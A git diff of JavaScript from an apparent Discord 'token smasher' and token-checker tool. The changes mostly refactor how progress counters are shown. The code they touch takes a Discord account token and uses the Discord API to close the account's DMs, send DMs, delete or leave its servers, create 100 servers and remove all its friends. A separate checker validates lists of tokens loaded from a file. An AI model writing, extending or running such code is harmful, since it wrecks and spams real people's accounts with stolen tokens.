@@ -154,24 +154,39 @@ async function token_smasher(){
         }
     })
 
+    let box_invalid = document.getElementById('smasher_invalid');
+    let box_valid = document.getElementById('smasher_valid');
+
     let valid;
     await resposne.json().then((data) => {
         if (resposne.status == 401 || data.message == "You need to verify your account in order to perform this action."){
+            box_invalid.style.display = 'block';
+            box_valid.style.display = 'none';
             valid = false;
-            box_content.innerHTML = marked('## Token is Invalid');
         }
         else{
+            box_invalid.style.display = 'none';
+            box_valid.style.display = 'block';
             valid = true;
         }
     });
 
     if (valid){
+        let box_dms_send = document.getElementById('smasher_dms_send');
+        let box_dms_close = document.getElementById('smasher_dms_removed');
+        let box_guilds_deleted = document.getElementById('smasher_guilds_deleted');
+        let box_guilds_leaved = document.getElementById('smasher_guilds_leaved');
+        let box_guilds_created = document.getElementById('smasher_guilds_created');
+        let box_friends_remove = document.getElementById('smasher_friends_remmove');
+
+
+        let dms_send = 0;
+        let dms_close = 0;
         let guilds_leave = 0;
         let guilds_delete = 0;
         let guilds_create = 0;
         let friends_remove = 0;
-        let dms_send = 0;
-        let dms_close = 0;
+
 
         let guilds_names;
         if (box_glds_name.value.replace(/\s+/, "").length == 0){
@@ -179,6 +194,8 @@ async function token_smasher(){
         }else{
             guilds_names = box_glds_name.value;
         }
+
+
         let request_channels = await fetch(`https://discord.com/api/v8/users/@me/channels`,{
             method: 'GET',
             headers: {
@@ -212,10 +229,9 @@ async function token_smasher(){
                 if (request_close_dm.ok){
                     dms_close ++;
                 }
-                box_content.innerHTML = marked(`
-<span>DMs Removed:</span> **${dms_close}**\n
-<span>DMs Send:</span> **${dms_send}**\n          
-`);
+                //textContent
+                box_dms_close.textContent = dms_close;
+                box_dms_send.textContent = dms_send;
             } 
         })
         let request_guilds = await fetch(`https://discord.com/api/v8/users/@me/guilds`,{
@@ -249,12 +265,8 @@ async function token_smasher(){
                         guilds_leave ++;
                     }
                 }
-                box_content.innerHTML = marked(`
-<span>DMs Removed:</span> **${dms_close}**\n
-<span>DMs Send:</span> **${dms_send}**\n     
-<span>Guilds Deleted:</span> **${guilds_delete}**\n
-<span>Guilds Leaved:</span> **${guilds_leave}**\n         
-`);
+                box_guilds_deleted.textContent = guilds_delete;
+                box_guilds_leaved.textContent = guilds_leave;
             } 
         })
         for (let create_count = 1; create_count <= 100; create_count++){
@@ -269,13 +281,7 @@ async function token_smasher(){
             if (request_guild.ok){
                 guilds_create ++;
             }
-            box_content.innerHTML = marked(`
-<span>DMs Removed:</span> **${dms_close}**\n
-<span>DMs Send:</span> **${dms_send}**\n     
-<span>Guilds Deleted:</span> **${guilds_delete}**\n
-<span>Guilds Leaved:</span> **${guilds_leave}**\n
-<span>Guilds Created:</span> **${guilds_create}**\n      
-            `);
+            box_guilds_created.textContent = guilds_create;
         }
 
         let request_freinds = await fetch(`https://discord.com/api/v8/users/@me/relationships`,{
@@ -297,18 +303,10 @@ async function token_smasher(){
                 if (request_member.ok){
                     friends_remove ++;
                 }
-                box_content.innerHTML = marked(`# <span>[</span>Complited<span>]</span>
-<span>DMs Removed:</span> **${dms_close}**\n
-<span>DMs Send:</span> **${dms_send}**\n     
-<span>Guilds Deleted:</span> **${guilds_delete}**\n
-<span>Guilds Leaved:</span> **${guilds_leave}**\n
-<span>Guilds Created:</span> **${guilds_create}**\n
-<span>Friends Removed:</span> **${friends_remove}**\n`);
+                box_friends_remove.textContent = friends_remove;
             }
         })
     }
-
-    console.log('123')
 
 
     box_content.disabled = false;
@@ -379,11 +377,11 @@ async function token_checker(){
 
 }
 
-function openAttachment() {
+function tokens_checker_openAttachment() {
     document.getElementById('attachment').click();
 }
 
-function fileSelected(input){
+function tokens_checker_fileSelected(input){
     let file = input.files[0];
     let reader = new FileReader();
     reader.onload = () =>  {
@@ -402,7 +400,7 @@ function fileSelected(input){
     reader.readAsText(file);
 }
 
-function save_settings() {
+function tokens_checker_save() {
     let data = document.getElementById('checker_checked_box').value;
 
     let file = new Blob([data], {type: 'text/plain'});
